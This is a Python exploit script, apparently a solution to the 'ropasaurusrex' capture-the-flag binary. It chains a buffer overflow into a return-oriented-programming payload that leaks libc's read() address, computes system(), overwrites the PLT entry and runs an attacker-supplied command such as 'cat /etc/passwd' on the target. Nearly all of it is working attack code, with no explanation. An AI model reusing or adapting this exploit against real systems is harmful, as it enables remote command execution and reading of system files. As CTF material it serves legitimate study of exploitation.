#!/usr/bin/python
import os, sys, socket
import struct

addr = ('127.0.0.1', 1337)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

cmd = sys.argv[1]+"\0"

#objdump -d libc.so.6-f85c96c8fc753bfa75140c39501b4cd50779f43a | grep [libc_start|system] 
#real_libcstart_offset = 0x0016bc0
#system_offset = 0x0039450

#objdump -d /lib/tls/i686/cmov/libc-2.11.1.so | grep [read|system]
#local offsets. don't use these in actual sploit
libcread_offset = 0xbdd20
system_offset = 0x39100

#write stdin to memory using read()
payload = "A"*140
payload += struct.pack("<I", 0x0804832C) #read() call location #objdump -d ropasaurusrex | grep read
payload += struct.pack("<I", 0x080484b6) #pop-pop-pop-ret #found by generating gadgets in non-PIE executable
payload += struct.pack("<I", 0) #stdin
payload += struct.pack("<I", 0x08049530) #.dynamic #store cat /etc/passwd here
payload += struct.pack("<I", len(cmd)) #len("cat /etc/passwd")

#leak addr of read()'s address in randomized libc
payload += struct.pack("<I", 0x0804830c) #write() call location #objdump -d ropasaurusrex | grep write
payload += struct.pack("<I", 0x080484b6) #pop-pop-pop-ret
payload += struct.pack("<I", 1) #stdout
payload += struct.pack("<I", 0x0804961c) #read() in plt
payload += struct.pack("<I", 4) #len

#call read() to overwrite read()'s entry in plt w/ addr of system()
payload += struct.pack("<I", 0x0804832C) #read() call location
payload += struct.pack("<I", 0x080484b6) #pop-pop-pop-ret
payload += struct.pack("<I", 0) #stdin
payload += struct.pack("<I", 0x0804961c) #read() in plt
payload += struct.pack("<I", 4) #4 bytes 
payload += struct.pack("<I", 0x0804832C) #call read() = system() now
payload += "BBBB" #bogus retn addr
payload += struct.pack("<I", 0x08049530) #.dynamic #where our cmd "cat /etc/passwd" is stored

s.connect(addr)
s.send(payload)
s.send(cmd)

#calculate system() addr and send back
addr = struct.unpack("<I",s.recv(1024))[0]
print "libc read() at 0x%.8x" % addr
addr = addr - libcread_offset + system_offset
print "system() is at 0x%.8x" % addr
s.send(struct.pack("<I", addr))

result = s.recv(1024)
print result

s.close()
